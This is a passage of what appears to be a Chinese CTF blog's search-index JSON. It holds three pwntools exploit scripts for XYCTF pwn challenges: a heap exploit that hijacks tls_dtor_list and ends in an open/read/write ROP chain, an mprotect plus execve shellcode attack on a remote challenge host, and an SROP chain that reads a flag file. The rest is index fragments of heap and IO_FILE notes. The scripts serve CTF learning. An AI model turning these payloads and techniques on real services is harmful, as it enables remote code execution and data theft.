b'\\\\x00')) def debug(): gdb.attach(p,\\\"b *main+34\\\") input(\\\"输入请继续\\\") def add_with_no_chunk(index): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(b\\\"-1\\\") return rl() def add(index,size,content): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) ru(b\\\"[?] Enter chunk data: \\\") sd(content) print(f\\\"----------\\\\n添加index为:{index}的chunk\\\\n----------\\\") def delete(index): ru(b\\\">>> \\\") sl(b\\\"2\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) print(f\\\"----------\\\\n删除index为{index}的chunk\\\\n----------\\\") def view(index): ru(b\\\">>> \\\") sl(b\\\"3\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) res = rc(0x68) return res def gift(): ru(b\\\">>> \\\") sl(b\\\"114514\\\") return (ru(b\\\"\\\\n\\\")) def getData(bytes): data = [] for i in range(int(len(bytes)/8)): try: data.append(u64(bytes[i*8:(i+1)*8])) except: print(\\\"非预期数据\\\") return data def rol(value): # 模拟 64 位无符号整数 mask = 0xFFFFFFFFFFFFFFFF return ((value << 0x11) | (value >> (64 - 0x11))) & mask def remove_high_digits(hex_num, desired_length): hex_str = hex(hex_num)[2:] # 将十六进制数字转换为字符串，并去掉开头的\\\"0x\\\" if len(hex_str) <= desired_length: return int(hex_str,16) # 如果字符串长度小于等于所需长度，直接返回 else: return int(hex_str[-desired_length:],16) # 否则，返回去掉最高位后的字符串 # 泄露出chunk for i in range(7): add(i,128,b\\\"a\\\"*8) for i in range(7,10): add(i,128,b\\\"a\\\"*8) for i in range(9): delete(i) for i in range(7): add(i,128,b\\\"\\\\x00\\\") add(7,128,b\\\"\\\\x00\\\") res = view(7) # data = view(5) base_libc = u64(res[8:16]) - 2207216 print(\\\"base_libc\\\",hex(base_libc)) delete(9) delete(10) # 泄露heap for i in range(7): add(i,128,b\\\"a\\\"*8) add(7,128,b\\\"a\\\"*8) add(8,0x38,b\\\"a\\\"*8) add(9,128,b\\\"a\\\"*8) add(10,0x38,b\\\"a\\\"*8) for i in range(7): delete(i) delete(7) delete(8) delete(9) # print(\\\"base_libc\\\",hex(base_libc)) for i in range(7): add(i,128,b\\\"\\\\x00\\\") # debug() # 0x5633731e9da0 add(7,0x58,b\\\"\\\\x00\\\") res = view(7) base_heap = u64(res[8:16])-7856 for i in range(719): add(15,128,b\\\"a\\\"*8) #0x3b0 for i in range(12): add(i,0x68,b\\\"a\\\"*8) for i in range(11): delete(i) add(14,0x38,b\\\"\\\\x00\\\") add(14,128,b\\\"\\\\x00\\\") fd = 0x100 add(14,0x58,(b\\\"a\\\"*(0x40-0x10))+p64(0)+p64(0x91)+p64(0x100)+p64(1)+p64(base_heap+0xb20+0x10)) # index:10 # 构造fastbin for i in range(9): add(i,0x68,b\\\"a\\\"*8) for i in range(9): delete(i) # 0x5600edb1db20-0x5600edb1d000 delete(10) for i in range(7): add(14,0x68,b\\\"/bin/sh\\\\x00\\\") tls = base_libc -10432 xor = ((base_heap)>>12) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(base_libc-0x28c0)+p64(base_libc-0x1ea0)) res = view(14) # 0x7fe867b61160 data = getData(res) # print(data) for i in data: print(hex(i)) canary = data[5] key = data[6] for i in range(759): add(14,128,b\\\"/bin/sh\\\\x00\\\") for i in range(13): add(i,0x48,b\\\"/bin/sh\\\\x00\\\") for i in range(13): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x58,b\\\"a\\\"*8) # fd add(14,128,p64(0)+p64(0x100)+p64(0x100)+p64(1)+p64(base_heap+0x42050+0x10)) # index 8 for i in range(8): add(i,0x78,b\\\"/bin/sh\\\\x00\\\") for i in range(9,13): add(i,0x78,b\\\"/bin/sh\\\\x00\\\") for i in range(8): delete(i) for i in range(9,12): delete(i) delete(8) write = p64(base_libc+0x114870) open64 = p64(base_libc+0x1144E0 ) read = p64(base_libc+0x1147D0) pop_rdi = p64(base_libc+0x2a3e5) pop_rsi = p64(base_libc+0x2be51) pop_rdx_r12 = p64(base_libc+0x11f2e7) pop_rsp = p64(base_libc+0x35732) leave = base_libc+0x133BEA flag = base_heap+0x1398 r_s = base_heap+0x1390 buff = base_heap+0xf40 sendline = base_libc+0x119170 addr = rol(leave^key) pop_rcx =base_libc +0x3d1ee for i in range(4): add(i,0x78,b\\\"r\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+b\\\"./flag\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")) add(4,0x78,b\\\"\\\\x00\\\"*0x60) add(5,0x78,b\\\"a\\\") add(6,0x78,pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x40)+p64(0)+write) tls_dtor_list = tls-88 add(7,0x78,p64((xor+0x42)^(tls_dtor_list-8))) add(14,0x78,b\\\"\\\\x00\\\") add(14,0x78,b\\\"\\\\x00\\\") add(14,0x78,p64(0)+p64(base_heap+0x42260)) # add(14,128,p64(addr)+pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+write) add(14,128,p64(addr)+pop_rdi+p64(flag)+pop_rsi+p64(0)+open64+pop_rdi+p64(3)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+read+pop_rsp+p64(base_heap+0xba0)) print(\\\"tls_dtor_list\\\",hex(tls_dtor_list)) print(\\\"canary\\\",hex(canary)) print(\\\"key\\\",hex(key)) print(\\\"base_heap\\\",hex(base_heap)) print(\\\"base_libc\\\",hex(base_libc)) print(\\\"addr\\\",hex(addr)) print(\\\"leave:\\\",hex(leave)) # debug() # 0x556f210bd050-0x556f2107b000 # print(\\\"canary\\\",hex(canary)) # print(\\\"key\\\",hex(key)) # print(\\\"base_heap\\\",hex(base_heap)) # print(\\\"base_libc\\\",hex(base_libc)) # debug() ru(b\\\">>> \\\") sl(b\\\"4\\\") ia() \"]},\"289\":{\"h\":\"static_link\",\"t\":[\"静态链接 我们直接通过mprotect函数 开一块内存出来执行shellcode即可\",\" import time from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 33168 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) pop_rdi = p64(0x401f1f) pop_rsi = p64(0x409f8e) pop_rdx = p64(0x451322) ret = p64(0x40101a) read = p64(0x447580 ) mprotect = p64(0x4482C0) ru(b\\\"static_link? ret2??\\\\n\\\") bss_addr = 0x4C8000 payload = b\\\"a\\\"*0x28+pop_rdi+p64(bss_addr)+pop_rsi+p64(4096)+pop_rdx+p64(7)+mprotect+pop_rdi+p64(0)+pop_rsi+p64(bss_addr)+pop_rdx+p64(50)+read+p64(bss_addr) sd(payload) time.sleep(20) shellcode =b\\\"\\\\x31\\\\xf6\\\\x48\\\\xbb\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x56\\\\x53\\\\x54\\\\x5f\\\\x6a\\\\x3b\\\\x58\\\\x31\\\\xd2\\\\x0f\\\\x05\\\" sd(shellcode) ia() \"]},\"290\":{\"h\":\"simple_srop\",\"t\":[\"srop+orw 注意一下每个指令之间执行的间距就可以了\",\"from pwn import * import time context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 53647 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) bss = 0x404060+0x100 bss_addr = p64(bss) ret_addr = p64(0x40101a) sigreturn_syscall = p64(0x401296) syscall = 0x40129D #调用read在bss段部署payload sigFrame=SigreturnFrame() sigFrame.rax=0 sigFrame.rdi=0 sigFrame.rsi=bss sigFrame.rdx=0x700 # 加0x8是因为这个位置放./flag字符串 sigFrame.rsp = bss+0x8 sigFrame.rip=syscall payload = b\\\"a\\\"*0x28 + sigreturn_syscall + bytes(sigFrame) print(\\\"bss段:\\\",hex(bss)) sd(payload) # 第二次构造 orw sigFrame2=SigreturnFrame() sigFrame2.rax=2 # ./flag sigFrame2.rdi=bss sigFrame2.rsi=0 sigFrame2.rdx=0 # 264是调试出来的 sigFrame2.rsp = bss+0x108 sigFrame2.rip=syscall # read函数 sigFrame3=SigreturnFrame() sigFrame3.rax=0 sigFrame3.rdi=3 # 随便写的位置 sigFrame3.rsi=bss+0x400 sigFrame3.rdx=0x36 sigFrame3.rsp = bss+520 sigFrame3.rip=syscall # write函数 sigFrame4=SigreturnFrame() sigFrame4.rax=1 sigFrame4.rdi=1 # flag位置 sigFrame4.rsi=bss+0x400 sigFrame4.rdx=0x36 sigFrame4.rsp = bss+520 sigFrame4.rip=syscall payload =b\\\"./flag\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+ sigreturn_syscall + bytes(sigFrame2) +sigreturn_syscall+bytes(sigFrame3)+sigreturn_syscall+bytes(sigFrame4) print(\\\"open+read的长度:\\\",len(payload)) input(\\\"第二次输入\\\") sd(payload) time.sleep(10) ia() \"]},\"291\":{\"h\":\"Development\"},\"292\":{\"h\":\"Posts\"},\"293\":{\"h\":\"Android\"},\"294\":{\"h\":\"Docker\"},\"295\":{\"h\":\"Git\"},\"296\":{\"h\":\"Python\"},\"297\":{\"h\":\"Heap\"},\"298\":{\"h\":\"Pwn\"},\"299\":{\"h\":\"Io File\"},\"300\":{\"h\":\"Linux Source Code\"},\"301\":{\"h\":\"Php Pwn\"},\"302\":{\"h\":\"Stack\"},\"303\":{\"h\":\"Tool Skill\"},\"304\":{\"h\":\"Hgame Week2\"},\"305\":{\"h\":\"Re\"},\"306\":{\"h\":\"Nssctf\"},\"307\":{\"h\":\"Competition\"},\"308\":{\"h\":\"Xyctf\"}},\"dirtCount\":0,\"index\":[[\"随便写的位置\",{\"1\":{\"290\":1}}],[\"随缘更新\",{\"1\":{\"111\":1}}],[\"静态链接\",{\"1\":{\"289\":1}}],[\"位无符号整数\",{\"1\":{\"288\":1}}],[\"位置写第三个chunk\",{\"1\":{\"181\":1}}],[\"位置写入指针指向第二个chunk\",{\"1\":{\"181\":1}}],[\"位置\",{\"1\":{\"132\":2,\"150\":1}}],[\"模拟\",{\"1\":{\"288\":1}}],[\"输入请继续\",{\"1\":{\"288\":1}}],[\"输出了libc地址\",{\"1\":{\"274\":1}}],[\"输出chunk内容的时候也是根据我们输入的size来进行输出的\",{\"1\":{\"274\":1}}],[\"输出\",{\"1\":{\"252\":1}}],[\"输出类名\",{\"1\":{\"22\":1}}],[\"输出结果\",{\"1\":{\"17\":1,\"19\":1}}],[\"值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag\",{\"1\":{\"288\":1}}],[\"多了一个orw的利用\",{\"1\":{\"288\":1}}],[\"多线程分配\",{\"0\":{\"133\":1}}],[\"多线程支持\",{\"1\":{\"131\":1}}],[\"多线程pwn\",{\"0\":{\"131\":1}}],[\"相对于ptmp只是多了一个sandbox限制\",{\"1\":{\"288\":1}}],[\"相当于\",{\"1\":{\"236\":1}}],[\"相当于是告诉我们plt\",{\"1\":{\"236\":1}}],[\"相当于让\",{\"1\":{\"188\":1}}],[\"相当于为未来可能的值占位的作用\",{\"1\":{\"65\":1}}],[\"相当于遍历\",{\"1\":{\"21\":1}}],[\"相当于向java层提供了一个callback函数\",{\"1\":{\"16\":1}}],[\"成功构造fake\",{\"1\":{\"276\":1}}],[\"成功泄露\",{\"1\":{\"260\":1}}],[\"链子\",{\"1\":{\"276\":1}}],[\"链接部分\",{\"0\":{\"200\":1}}],[\"链接\",{\"0\":{\"29\":1}}],[\"处于使用状态\",{\"1\":{\"276\":1}}],[\"前6号占满\",{\"1\":{\"276\":1}}],[\"前一个chunk的指针\",{\"1\":{\"80\":1}}],[\"非预期数据\",{\"1\":{\"276\":1,\"288\":1}}],[\"非主分配区申请后\",{\"1\":{\"138\":1}}],[\"非主分配区一般都是通过mmap向系统申请内存\",{\"1\":{\"138\":1}}],[\"非主分配区用mmap来映射获取内存\",{\"1\":{\"132\":1}}],[\"非主分配区\",{\"0\":{\"132\":1},\"1\":{\"138\":1}}],[\"任意free\",{\"1\":{\"275\":1}}],[\"三个chunk\",{\"1\":{\"273\":1}}],[\"三种情况下会被自动触发\",{\"1\":{\"208\":1}}],[\"造成one\",{\"1\":{\"272\":1}}],[\"造成prev\",{\"1\":{\"153\":1}}],[\"白给\",{\"1\":{\"270\":1}}],[\"十进制或十六进制\",{\"1\":{\"269\":1}}],[\"请输入要查看内容的内存块名字\",{\"1\":{\"269\":1}}],[\"请输入大小\",{\"1\":{\"269\":1}}],[\"请输入名字\",{\"1\":{\"269\":1}}],[\"请记住和指针常量的区别\",{\"1\":{\"184\":1}}],[\"尝试fork一个新进程\",{\"1\":{\"268\":1}}],[\"尝试覆盖\",{\"0\":{\"256\":1}}],[\"甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域\",{\"1\":{\"268\":1}}],[\"想成了利用retfq来转化为32位绕过open等函数的禁止\",{\"1\":{\"268\":1}}],[\"想要了解对应部分就直接点击标题跳转即可第一次阅读glibc的源码然后进行分析\",{\"1\":{\"92\":1}}],[\"禁止了orw的orw\",{\"1\":{\"268\":1}}],[\"两字节\",{\"1\":{\"267\":1}}],[\"两次栈溢出\",{\"1\":{\"266\":1}}],[\"两个fastbin情况\",{\"1\":{\"260\":1}}],[\"两个chunk会合并为一个较大的chunk\",{\"1\":{\"114\":1}}],[\"概率还挺大\",{\"1\":{\"265\":1}}],[\"选择\",{\"0\":{\"263\":1}}],[\"按照栈顶依次选择\",{\"1\":{\"261\":1}}],[\"按固定大小切好的small内存槽\",{\"1\":{\"223\":1}}],[\"开一块内存出来执行shellcode即可\",{\"1\":{\"289\":1}}],[\"开始构造double\",{\"1\":{\"276\":1}}],[\"开始构造一个chunk处于fastbin中情况\",{\"1\":{\"273\":1}}],[\"开始泄露\",{\"1\":{\"260\":1}}],[\"开源协议\",{\"0\":{\"8\":1}}],[\"控制bss\",{\"1\":{\"260\":1}}],[\"控制fd\",{\"1\":{\"260\":1}}],[\"控制内容chunk刚好为原本某一个的头chunk\",{\"1\":{\"159\":1,\"281\":1}}],[\"删除一个index\",{\"1\":{\"260\":1}}],[\"好像还是不太对\",{\"1\":{\"255\":1}}],[\"►\",{\"1\":{\"255\":1}}],[\"更改\",{\"1\":{\"251\":1}}],[\"制表符和换行符\",{\"1\":{\"251\":1}}],[\"命令行参数处理以及读取和解析数据至关重要\",{\"1\":{\"251\":1}}],[\"命令详解\",{\"1\":{\"41\":1}}],[\"适用于高级用户\",{\"1\":{\"249\":1}}],[\"便于查看和编辑文件\",{\"1\":{\"249\":1}}],[\"个字节\",{\"1\":{\"249\":1}}],[\"行\",{\"1\":{\"249\":1}}],[\"例如\",{\"1\":{\"249\":2}}],[\"数值\",{\"1\":{\"249\":4}}],[\"默许情况下显示文件的最后10行\",{\"1\":{\"249\":1}}],[\"默许情况下显示前10行\",{\"1\":{\"249\":1}}],[\"默认情况下\",{\"1\":{\"249\":2,\"251\":1}}],[\"默认值64\",{\"1\":{\"132\":1}}],[\"默认值为\",{\"1\":{\"69\":1}}],[\"默认activity标志\",{\"0\":{\"40\":1}}],[\"默认activity\",{\"0\":{\"38\":1}}],[\"退出\",{\"1\":{\"249\":1}}],[\"逐行滚动\",{\"1\":{\"249\":1}}],[\"键盘操作\",{\"1\":{\"249\":1}}],[\"屏幕上显示的文本不会被清除\",{\"1\":{\"249\":1}}],[\"时\",{\"1\":{\"249\":1}}],[\"时创建线程的返回值\",{\"1\":{\"243\":1}}],[\"长行将不会被折行\",{\"1\":{\"249\":1}}],[\"显示文件开始的指定字节数\",{\"1\":{\"249\":1}}],[\"显示文件开始的指定行数\",{\"1\":{\"249\":1}}],[\"显示帮助信息\",{\"1\":{\"249\":1}}],[\"显示控制字符\",{\"1\":{\"249\":1}}],[\"显示百分比表示的文件位置\",{\"1\":{\"249\":1}}],[\"显示更详细的提示信息\",{\"1\":{\"249\":1}}],[\"显示每行的行号\",{\"1\":{\"249\":1}}],[\"显然第一种我们是没办法直接申请large\",{\"1\":{\"161\":1,\"283\":1}}],[\"显然不足以超过tcache\",{\"1\":{\"142\":1}}],[\"搜索关键字等\",{\"1\":{\"249\":1}}],[\"经常使用于查看文本文件的内容\",{\"1\":{\"249\":1}}],[\"经历了promise过程后future将会塞入返回值\",{\"1\":{\"65\":1}}],[\"`\",{\"1\":{\"248\":9}}],[\"`com\",{\"1\":{\"27\":1}}],[\"拿这玩意丢进虚拟机里面跑了一下\",{\"1\":{\"248\":1}}],[\"拿出来\",{\"1\":{\"102\":1}}],[\"丢进ida里面没用\",{\"1\":{\"248\":1}}],[\"现在提取flag数据进行解密\",{\"1\":{\"247\":1}}],[\"现在在栈顶\",{\"1\":{\"234\":1}}],[\"反调试知道了\",{\"1\":{\"247\":1}}],[\"反方向循环\",{\"1\":{\"106\":1}}],[\"动调\",{\"0\":{\"246\":1}}],[\"动态链接器解析程序中的符号引用\",{\"1\":{\"239\":1}}],[\"动态链接器查找这些共享库的位置\",{\"1\":{\"239\":1}}],[\"动态链接器检查程序的头部\",{\"1\":{\"239\":1}}],[\"动态链接库顺序\",{\"1\":{\"237\":1}}],[\"真实情况我们以动调为标准\",{\"1\":{\"245\":1}}],[\"几乎每个函数都是长这个样子的\",{\"1\":{\"245\":1}}],[\"它告诉\",{\"1\":{\"251\":1}}],[\"它的资源不会立即被操作系统回收\",{\"1\":{\"243\":1}}],[\"它将当前\",{\"1\":{\"109\":1}}],[\"线程库\",{\"1\":{\"243\":1}}],[\"线程中malloc\",{\"1\":{\"134\":1}}],[\"地址\",{\"0\":{\"241\":1}}],[\"地址后面的内容会被当成栈\",{\"1\":{\"231\":1}}],[\"确保它们指向正确的地址\",{\"1\":{\"239\":1}}],[\"确实重要\",{\"1\":{\"229\":1}}],[\"符号解析\",{\"1\":{\"239\":1}}],[\"符号索引\",{\"1\":{\"234\":1}}],[\"陷入系统内核操作\",{\"1\":{\"239\":1}}],[\"系统调用\",{\"1\":{\"239\":1,\"243\":1}}],[\"系统默认系统之前查找\",{\"1\":{\"238\":1}}],[\"系统其实给我们的是一样的chunk大小\",{\"1\":{\"115\":1}}],[\"转化为32位\",{\"1\":{\"268\":1}}],[\"转\",{\"1\":{\"237\":1}}],[\"都不是特别好使hhh\",{\"1\":{\"237\":1}}],[\"省略点将\",{\"1\":{\"236\":1}}],[\"放入\",{\"1\":{\"234\":1}}],[\"恢复原始的返回地址\",{\"1\":{\"234\":1}}],[\"恢复第一个参数\",{\"1\":{\"234\":1}}],[\"恢复第二个参数\",{\"1\":{\"234\":1}}],[\"恢复寄存器\",{\"1\":{\"234\":1}}],[\"通常是符号索引\",{\"1\":{\"234\":1}}],[\"通过chunk进入tcache然后\",{\"1\":{\"272\":1}}],[\"通过chunk进入unsortedbin中然后输出fd和bk泄露libc地址\",{\"1\":{\"272\":1}}],[\"通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差\",{\"1\":{\"259\":1}}],[\"通过将ebp覆盖成构造的fake\",{\"1\":{\"230\":1}}],[\"通过两次double\",{\"1\":{\"157\":1,\"279\":1}}],[\"通过向chunk写入内容来劫持信息头chunk\",{\"1\":{\"157\":1,\"279\":1}}],[\"通过write函数直接泄露libc地址\",{\"1\":{\"157\":1,\"279\":1}}],[\"通过malloc\",{\"1\":{\"157\":1,\"279\":1}}],[\"通过fastbin\",{\"1\":{\"120\":1}}],[\"通过unlink将该chunk脱离出来\",{\"1\":{\"109\":1}}],[\"通过unlink脱链\",{\"1\":{\"106\":1}}],[\"通过next\",{\"1\":{\"97\":1}}],[\"通过p的fd获取上一个chunk\",{\"1\":{\"129\":1}}],[\"通过p的fd\",{\"1\":{\"81\":1}}],[\"通过上面信息\",{\"1\":{\"40\":1}}],[\"传递\",{\"1\":{\"234\":1}}],[\"保护\",{\"1\":{\"254\":1}}],[\"保存第二个参数\",{\"1\":{\"234\":1}}],[\"保存第一个参数\",{\"1\":{\"234\":1}}],[\"保存原始的返回地址\",{\"1\":{\"234\":1}}],[\"保存寄存器\",{\"1\":{\"234\":1}}],[\"保留最基本结构\",{\"1\":{\"114\":1}}],[\"注意一下每个指令之间执行的间距就可以了\",{\"1\":{\"290\":1}}],[\"注意\",{\"1\":{\"234\":1}}],[\"注册事件\",{\"1\":{\"64\":1}}],[\"汇编\",{\"1\":{\"234\":1}}],[\"自动跳转plt\",{\"1\":{\"234\":1}}],[\"自动就好了\",{\"1\":{\"43\":1}}],[\"需要\",{\"1\":{\"276\":1}}],[\"需要实际实现\",{\"1\":{\"234\":1}}],[\"需要了解的参考这个文章\",{\"1\":{\"234\":1}}],[\"需要注意的是\",{\"1\":{\"114\":1}}],[\"把b包含在合并后的大chunk中\",{\"1\":{\"273\":1}}],[\"把变量名字改改\",{\"1\":{\"244\":1}}],[\"把fake\",{\"1\":{\"231\":1}}],[\"把中间的chunk忽略掉\",{\"1\":{\"81\":1}}],[\"程序寻找libc的顺序\",{\"0\":{\"238\":1}}],[\"程序会自动保存下一个指令的地址\",{\"1\":{\"231\":1}}],[\"程序员可以选择显性地去书写和类同名地一个public方法\",{\"1\":{\"20\":1}}],[\"还有个和这个很相似的变量\",{\"1\":{\"238\":1}}],[\"还有一种是revert\",{\"1\":{\"59\":1}}],[\"还任然留在了原地\",{\"1\":{\"231\":1}}],[\"栈的指针寄存器\",{\"1\":{\"231\":1}}],[\"栈迁移+float数据格式\",{\"0\":{\"254\":1}}],[\"栈迁移核心\",{\"0\":{\"231\":1}}],[\"栈迁移的大致操作\",{\"0\":{\"230\":1}}],[\"栈迁移\",{\"0\":{\"229\":1},\"1\":{\"271\":1}}],[\"换句话说\",{\"1\":{\"231\":1}}],[\"到现在我们就可以理清楚了核心需要实现的部分\",{\"1\":{\"231\":1}}],[\"头\",{\"1\":{\"226\":1}}],[\"依次向右取值\",{\"1\":{\"225\":1}}],[\"间距0x280\",{\"1\":{\"225\":1}}],[\"特别详细和好理解\",{\"1\":{\"223\":1}}],[\"占满tcache\",{\"1\":{\"276\":1}}],[\"占满tacache\",{\"1\":{\"87\":1}}],[\"占用的已经删除\",{\"1\":{\"273\":1}}],[\"占用的page数等\",{\"1\":{\"223\":1}}],[\"各个链的chunk\",{\"1\":{\"276\":1}}],[\"各page的信息\",{\"1\":{\"223\":1}}],[\"各版本的轻量级pwn环境\",{\"0\":{\"47\":1}}],[\"缓存的chunk数\",{\"1\":{\"223\":1}}],[\"缓存的chunk链表\",{\"1\":{\"223\":1}}],[\"已分配chunk数\",{\"1\":{\"223\":1}}],[\"已经知道\",{\"1\":{\"180\":1}}],[\"已经完成覆写\",{\"1\":{\"162\":1,\"284\":1}}],[\"除了huge\",{\"1\":{\"223\":1}}],[\"单链表\",{\"1\":{\"223\":1}}],[\"书栈网\",{\"1\":{\"221\":1,\"222\":1}}],[\"试读\",{\"1\":{\"221\":1,\"222\":1}}],[\"zip\",{\"1\":{\"248\":1}}],[\"zend中只有一个heap结构\",{\"1\":{\"223\":1}}],[\"zend\",{\"1\":{\"223\":23,\"224\":21,\"226\":10,\"227\":11}}],[\"zend内存池\",{\"1\":{\"221\":1}}],[\"zhuanlan\",{\"1\":{\"36\":1}}],[\"zhihu\",{\"1\":{\"1\":1,\"36\":2,\"39\":1,\"57\":1,\"62\":1,\"234\":1}}],[\"解析依赖\",{\"1\":{\"239\":1}}],[\"解释数据的方式\",{\"1\":{\"251\":1}}],[\"解释部分函数\",{\"0\":{\"243\":1}}],[\"解释\",{\"0\":{\"219\":1}}],[\"解除分配区锁\",{\"1\":{\"138\":1}}],[\"读取了flag而且写入了chunk中再把chunk\",{\"1\":{\"269\":1}}],[\"读书笔记\",{\"1\":{\"217\":1}}],[\"读题\",{\"0\":{\"86\":1}}],[\"阅读\",{\"1\":{\"217\":1}}],[\"阅读前后逻辑我们知道这段代码中bck=fwd\",{\"1\":{\"110\":1}}],[\"小内存分配的可用位置链表\",{\"1\":{\"223\":1}}],[\"小于2mb\",{\"1\":{\"223\":1}}],[\"小于3\",{\"1\":{\"223\":1}}],[\"小于minsize\",{\"1\":{\"106\":1}}],[\"小知识点\",{\"0\":{\"215\":1}}],[\"虚函数表指针在\",{\"1\":{\"213\":1}}],[\"虚表偏移量为0\",{\"1\":{\"211\":1}}],[\"验证虚表指针\",{\"1\":{\"213\":1}}],[\"防御机制\",{\"0\":{\"212\":1}}],[\"防止fastbin合并后直接被topchunk合并\",{\"1\":{\"161\":1,\"283\":1}}],[\"防止double\",{\"1\":{\"123\":1}}],[\"宽字符数据的写入缓冲区中有待写入的数据\",{\"1\":{\"211\":1}}],[\"表示结束地址\",{\"1\":{\"215\":1}}],[\"表示操作的起始地址\",{\"1\":{\"215\":1}}],[\"表示文件不可写\",{\"1\":{\"211\":1}}],[\"表示bin数组当中某一个下标的bin是否为空\",{\"1\":{\"132\":1}}],[\"知道libc基地址\",{\"1\":{\"207\":1}}],[\"知乎\",{\"1\":{\"1\":1,\"36\":1,\"39\":1,\"57\":1,\"62\":1,\"234\":1}}],[\"太笨了\",{\"1\":{\"255\":1}}],[\"太长了\",{\"1\":{\"205\":1}}],[\"太多了\",{\"1\":{\"27\":1}}],[\"满足好奇心\",{\"1\":{\"199\":1}}],[\"满足以上条件\",{\"1\":{\"98\":1}}],[\"变成\",{\"1\":{\"276\":1}}],[\"变成对应的文件描述符了\",{\"1\":{\"205\":1}}],[\"变量\",{\"1\":{\"251\":1}}],[\"变量的指针\",{\"1\":{\"243\":1}}],[\"变化\",{\"1\":{\"196\":1,\"202\":1,\"205\":1}}],[\"变为allocted\",{\"1\":{\"150\":1,\"154\":1}}],[\"扩展的实现原理\",{\"1\":{\"222\":1}}],[\"扩展开发\",{\"1\":{\"222\":1}}],[\"扩展\",{\"1\":{\"193\":1}}],[\"部分前置知识讲解\",{\"0\":{\"233\":1}}],[\"部分\",{\"0\":{\"191\":1}}],[\"深入窥探动态链接\",{\"1\":{\"234\":1}}],[\"深入理解\",{\"0\":{\"189\":1},\"1\":{\"235\":1}}],[\"深入学习堆结构\",{\"0\":{\"111\":1}}],[\"打开文件\",{\"0\":{\"203\":1},\"1\":{\"188\":2}}],[\"打印参数个数\",{\"1\":{\"19\":1}}],[\"假如之前\",{\"1\":{\"188\":1}}],[\"暂时不搬出来了\",{\"1\":{\"185\":1}}],[\"倒不如说它就是文件流\",{\"1\":{\"185\":1}}],[\"创建unsortedbin大小占满\",{\"1\":{\"276\":1}}],[\"创建了一个index\",{\"1\":{\"260\":1}}],[\"创建\",{\"1\":{\"185\":1}}],[\"创建一个非主分配区\",{\"1\":{\"138\":1}}],[\"叫做文件流\",{\"1\":{\"185\":1}}],[\"常用指令绕过\",{\"0\":{\"248\":1}}],[\"常量指针是指针\",{\"1\":{\"184\":1}}],[\"常规\",{\"1\":{\"132\":1}}],[\"核心l\",{\"1\":{\"206\":1}}],[\"核心结构体\",{\"0\":{\"184\":1}}],[\"核心还是劫持vtable\",{\"1\":{\"178\":1}}],[\"整体脉络\",{\"1\":{\"183\":1}}],[\"整个利用原理不算难但是细节很多很多地方需要微调\",{\"1\":{\"157\":1,\"279\":1}}],[\"感觉较为复杂\",{\"1\":{\"183\":1}}],[\"浅学习io\",{\"0\":{\"183\":1}}],[\"浅学习1\",{\"0\":{\"48\":1}}],[\"总是打印每个文件的名称作为头部\",{\"1\":{\"249\":1}}],[\"总大小512bit\",{\"1\":{\"223\":1}}],[\"总结就是\",{\"1\":{\"181\":1}}],[\"总感觉比较难记住\",{\"1\":{\"93\":1}}],[\"偏移0xf0\",{\"1\":{\"173\":1}}],[\"提取vatble\",{\"1\":{\"172\":1}}],[\"提交pr的规范\",{\"0\":{\"55\":1}}],[\"提交信息格式\",{\"0\":{\"49\":1},\"1\":{\"48\":1}}],[\"提交频率\",{\"1\":{\"48\":1}}],[\"覆盖上我们想要修改的地址\",{\"1\":{\"173\":1}}],[\"覆盖vatble\",{\"0\":{\"170\":1}}],[\"覆写数据\",{\"0\":{\"173\":1}}],[\"覆写chunk0的fd\",{\"1\":{\"151\":1}}],[\"伪造\",{\"1\":{\"169\":1}}],[\"伪造fake\",{\"0\":{\"159\":1,\"281\":1},\"1\":{\"157\":1,\"279\":1}}],[\"条件\",{\"0\":{\"168\":1,\"211\":1}}],[\"示例\",{\"1\":{\"234\":1}}],[\"示例程序\",{\"1\":{\"167\":1}}],[\"示意图\",{\"0\":{\"160\":1,\"177\":1,